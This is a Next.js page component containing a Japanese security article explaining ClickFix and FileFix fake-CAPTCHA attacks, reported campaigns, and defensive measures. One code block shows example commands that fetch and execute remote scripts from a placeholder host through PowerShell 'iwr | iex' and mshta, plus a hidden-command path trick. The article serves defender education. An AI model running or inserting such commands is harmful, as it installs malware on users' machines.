import { ArticleLayout } from "../../_components/ArticleLayout";
import { getArticle } from "@/lib/articles";

const article = getArticle("security", "clickfix")!;

export default function Page() {
  return (
    <ArticleLayout article={article}>
      <p>
        <strong>ClickFix</strong>は、2025年から2026年にかけて爆発的に増えた新型のソーシャルエンジニアリング攻撃です。手口を一言でいえば、<strong>「被害者自身に、自分のPCでマルウェアを実行させる」</strong>。偽のCAPTCHAや偽のエラー画面で「これを貼り付けて実行すれば直ります」と指示し、ユーザーが言われたとおりにコマンドを実行してしまう——それだけで感染が成立します。
      </p>
      <p>
        Microsoftの観測では、<strong>ClickFixは2025年上半期だけで517%増加し、追跡する侵入の47%を占める</strong>までになりました。CAPTCHAを悪用したフィッシングは2026年3月の1か月で倍増し、<strong>1,190万件</strong>に達したと報じられています。本記事は、なぜこの「単純な手口」がこれほど効くのか、実際の攻撃事例、そして組織と個人がとるべき具体的な防御を、実務目線で整理します。
      </p>

      <h2>ClickFixとは何か</h2>
      <p>
        従来のマルウェア配布は「不正な添付ファイルを開かせる」「改ざんサイトの脆弱性で勝手に実行する（ドライブバイ）」のどちらかでした。ClickFixはそのどちらでもありません。<strong>攻撃者は何も実行しません。実行するのは被害者本人</strong>です。
      </p>
      <p>典型的な流れはこうです。</p>
      <ol>
        <li>改ざんされたサイトや偽広告で、<strong>「あなたは人間ですか？」という偽CAPTCHA</strong>や、<strong>「このページの表示に問題があります。修復してください」という偽エラー</strong>が表示される。</li>
        <li>「認証を完了するには次の手順に従ってください」として、<strong>① Win + R キーを押す　② Ctrl + V で貼り付ける　③ Enter を押す</strong>、と案内される。</li>
        <li>ユーザーが気づかないうちに、ページのJavaScriptが<strong>クリップボードに悪意あるコマンドを書き込んでいる</strong>。「コピー」ボタンを押させる場合も多い。</li>
        <li>ユーザーが指示どおり Run ダイアログ（ファイル名を指定して実行）に貼り付けて Enter を押すと、<strong>PowerShell が起動し、外部からマルウェアをダウンロードしてメモリ上で実行</strong>する。</li>
      </ol>
      <p>
        被害者から見れば「CAPTCHAをクリアするための正規手順」を踏んだだけ。しかし実際には、自分の手で感染スクリプトを起動させられているのです。「Click（クリック）して Fix（修復）する」という体裁が、そのまま攻撃名の由来になっています。
      </p>

      <h2>なぜ防ぎにくいのか</h2>
      <p>
        ClickFixが厄介なのは、<strong>従来の防御の「前提」をすり抜ける</strong>点にあります。
      </p>
      <ul>
        <li>
          <strong>ファイルのダウンロードがない</strong>：実行されるのは Windows 標準の <code>powershell.exe</code> や <code>mshta.exe</code>。署名済みの正規バイナリ（LOLBins）なので、シグネチャ型のアンチウイルスでは「正常な操作」に見える。
        </li>
        <li>
          <strong>ユーザー自身が起動する</strong>：脆弱性を突かないため、パッチでは塞げない。メールゲートウェイやサンドボックスも、ユーザーがブラウザ外で手動実行する操作は追えない。
        </li>
        <li>
          <strong>Mark of the Web（MOTW）が付かない</strong>：手で貼り付けて実行するため「インターネット由来」のフラグが付かず、<strong>SmartScreen などの出所ベースの警告が出ない</strong>。
        </li>
        <li>
          <strong>信頼できるサイトが踏み台になる</strong>：大学や有名サービスのサイトが改ざんされて配信元になると、URLを見ても怪しさに気づけない。
        </li>
      </ul>

      <h2>クリップボードに仕込まれるコマンドの例</h2>
      <p>
        実際にコピーさせられるコマンドは、難読化されつつ「メモリ上で外部スクリプトを取得・実行する」形が定番です（以下は教育目的の概念例で、実行可能なペイロードではありません）。
      </p>
      <pre>
        <code>{`# 概念例：PowerShellで外部スクリプトをメモリ実行
powershell -w hidden -c "iwr https://例.invalid/a | iex"

# 概念例：mshtaで遠隔HTAを実行（アプリ制御の許可リストを悪用）
mshta https://例.invalid/x.hta

# FileFix亜種：エクスプローラーのアドレスバーに見える"ファイルパス"の
# 後ろ（# 以降）に本体を隠す
powershell ... ;  # C:\\会社共有\\レポート.pdf`}</code>
      </pre>
      <p>
        近年は <code>nslookup</code> で DNS を介してペイロードを段階配信する亜種（Microsoftが2026年2月に開示）や、<code>rundll32</code> と WebDAV を組み合わせる亜種、<strong>画像ファイルの中にコードを潜ませる</strong>亜種なども確認されています。攻撃者は検知回避のため、使う「正規ツール」を次々と入れ替えています。
      </p>

      <h2>ClickFixとFileFix — Run無効化を回避する進化</h2>
      <p>
        防御側が「Win + R（Run ダイアログ）をグループポリシーで無効化する」という対策を打ち始めると、攻撃側はすぐに回避策を編み出しました。それが <strong>FileFix</strong>（研究者 mr.d0x が2025年6月に公表）です。
      </p>
      <h3>FileFixの何が新しいか</h3>
      <ul>
        <li>
          実行先を Run ダイアログから <strong>エクスプローラーのアドレスバー</strong>に変える。アドレスバーは業務で常用するため、Run のように一律無効化しにくい。
        </li>
        <li>
          「文書が壊れています。次のパスをアドレスバーに貼って開いてください」と案内し、クリップボードには<strong>正規のファイルパスに見える文字列の前後に PowerShell コマンドを隠した</strong>ものを入れる。<code>#</code> 以降をコメント化してパスだけを見せる手口が典型。
        </li>
        <li>
          エクスプローラー経由の起動は MOTW が付かず、<strong>SmartScreen を回避</strong>できる。
        </li>
      </ul>
      <p>
        ほかにも、壊れたフォント表示を装う <strong>GlitchFix</strong>、ブラウザのクラッシュ修復を装う <strong>CrashFix</strong> など、見せ方を変えた亜種が次々登場しています。本質は同じ——<strong>「ユーザーに正規ツールで一行実行させる」</strong>ことです。
      </p>

      <h2>実際の攻撃事例</h2>
      <h3>700以上のサイトが改ざん（2026年5月）</h3>
      <p>
        Ghost CMS の SQL インジェクション脆弱性 <strong>CVE-2026-26980</strong>（影響：3.24.0〜6.19.0）を悪用し、<strong>700以上の大学・テック企業のサイト</strong>が侵害されました。攻撃者は認証なしでデータベースから<strong>管理APIキーを読み取り</strong>、投稿やページに不正な JavaScript を注入。訪問者に偽の Cloudflare/CAPTCHA を見せてコマンドを貼り付けさせる、典型的な ClickFix フローへ誘導しました。根っこは古典的な{" "}
        <a href="/learn/security/sql-injection">SQLインジェクション</a>{" "}
        であり、修正版 6.19.1 が公開されています。
      </p>
      <h3>ClearFake亜種で14万台超が感染</h3>
      <p>
        改ざんサイトに偽更新・偽CAPTCHAを差し込む ClearFake 系のキャンペーンは、<strong>2025年8月から2026年初頭にかけて147,521台以上を感染</strong>させたと報告されています。配布されたのは <strong>LummaC2 や StealC といったインフォスティーラー</strong>で、保存済みパスワード・Cookie・暗号資産ウォレットなどを根こそぎ窃取します。
      </p>
      <h3>配布されるマルウェアの広がり</h3>
      <p>
        2026年第1四半期に ClickFix/FileFix 経由で観測されたペイロードは多岐にわたります：<strong>LummaC2、StealC、Rhadamanthys</strong>（情報窃取）、<strong>NetSupport RAT、AsyncRAT、Interlock RAT、Cobalt Strike</strong>（遠隔操作・侵入足場）、<strong>Latrodectus、MintsLoader</strong>（ローダー）、そして macOS を狙う <strong>AMOS Stealer</strong> まで。ClickFix は「入口」であり、その先にランサムウェアまで連鎖し得ます。
      </p>

      <h2>図解案：ClickFixの攻撃フロー</h2>
      <p>記事に添える概念図として、次の流れを1枚にすると理解が早まります。</p>
      <pre>
        <code>{`[改ざんサイト/偽広告]
      │ 偽CAPTCHA・偽エラーを表示
      ▼
[ページ内JavaScript] ──▶ クリップボードに悪意コマンドを書き込み
      │ 「Win+R → Ctrl+V → Enter」を案内
      ▼
[被害者本人が貼り付け実行]   ← ここが攻撃の実行点（人間が起点）
      │ powershell.exe / mshta.exe / rundll32（正規ツール=LOLBins）
      ▼
[メモリ上でペイロード取得・実行]
      │
      ▼
[インフォスティーラー / RAT / ローダー]
   → 認証情報・Cookie窃取、遠隔操作、ランサムウェアへ連鎖

★ 防御の鍵＝「人間が貼り付ける瞬間」と「正規ツールの異常な起動」`}</code>
      </pre>

      <h2>防御策：組織と個人で分けて考える</h2>
      <h3>利用者教育（最優先）</h3>
      <p>
        ClickFix は人間を狙う攻撃なので、まず<strong>「サイトの指示でコマンドを貼り付けて実行することは絶対にない」</strong>という1点を周知するのが最も効きます。覚えやすいルールに落とすと効果的です。
      </p>
      <ul>
        <li><strong>本物の CAPTCHA は、Win + R や PowerShell を開かせない</strong>。そう言われたら100%詐欺。</li>
        <li>「修復するには」「認証するには」とコマンド実行を促す画面は、ページを閉じる。</li>
        <li>身に覚えのない手順を踏む前に、情シス／セキュリティ窓口に確認する文化を作る。</li>
      </ul>
      <h3>エンドポイントの技術的対策</h3>
      <ul>
        <li>
          <strong>Run ダイアログの無効化</strong>：グループポリシー／Intune で一般ユーザーの Win + R を制限。ただし FileFix（アドレスバー経由）は別途対策が要る点に注意。
        </li>
        <li>
          <strong>アプリケーション制御（WDAC / AppLocker）と ASR ルール</strong>：ブラウザやエクスプローラーから <code>powershell.exe</code> / <code>mshta.exe</code> / <code>nslookup.exe</code> / <code>rundll32.exe</code> が子プロセスとして起動する挙動をブロック・監視する。
        </li>
        <li>
          <strong>PowerShell の防御強化</strong>：スクリプトブロックロギング、AMSI 連携、Constrained Language Mode を有効化し、難読化された <code>iex</code> 実行を可視化・抑止する。
        </li>
        <li>
          <strong>挙動ベース検知（EDR）</strong>：「ブラウザがクリップボードに書き込んだ直後に powershell が起動し、外部通信する」といった一連の流れをふるまいで捉える。
        </li>
      </ul>
      <h3>配信元を断つ・被害を広げない</h3>
      <ul>
        <li>
          自社サイトを<strong>踏み台にされない</strong>ために、CMS・プラグインのパッチを迅速に当てる（Ghost の事例のように{" "}
          <a href="/learn/security/sql-injection">SQLインジェクション</a>{" "}
          や{" "}
          <a href="/learn/security/xss">XSS</a>{" "}
          が入口になる）。<a href="/learn/security/http-security-headers">CSP などのセキュリティヘッダー</a>で外部スクリプト注入の影響を抑える。
        </li>
        <li>
          インフォスティーラーは<strong>セッション Cookie を盗んで多要素認証を回避</strong>する。<a href="/learn/security/mfa-totp-fido2">フィッシング耐性のある認証（FIDO2/Passkey）</a>への移行と、窃取時のセッション失効・再認証の仕組みを整える。
        </li>
        <li>
          DNS を悪用する亜種に備え、<a href="/learn/network/dns-basics">DNS</a>の問い合わせログを監視し、不審なドメインへの段階配信を検知する。
        </li>
      </ul>

      <h2>まとめ</h2>
      <p>
        ClickFix の本質は、<strong>「脆弱性ではなく人間の善意・反射を突く」</strong>点にあります。だからこそパッチだけでは止まらず、急速に主流化しました。守りの軸は3つです——<strong>「サイトの指示でコマンドを実行しない」という教育</strong>、<strong>正規ツール（LOLBins）の異常起動をふるまいで捉える検知</strong>、そして<strong>自社サイトを配信元にされないためのパッチとヘッダー設定</strong>。
      </p>
      <p>
        手口の派生（FileFix・GlitchFix・DNS/画像亜種）は今後も増えますが、入口は常に「人間に一行実行させる」一点に集約されます。フィッシング全般の考え方は{" "}
        <a href="/learn/security/owasp-top-10">OWASP Top 10</a>、認証情報窃取後の被害抑制は{" "}
        <a href="/learn/security/mfa-totp-fido2">MFA・FIDO2 の解説</a>{" "}
        も合わせてご覧ください。
      </p>
      <p>
        ※ 本記事のCVE番号・キャンペーン名・統計値は、各セキュリティベンダーおよび公開された報道・脆弱性データベースに基づきます。攻撃手法は変化が速いため、対策時は最新の公式情報をあわせてご確認ください。
      </p>
    </ArticleLayout>
  );
}
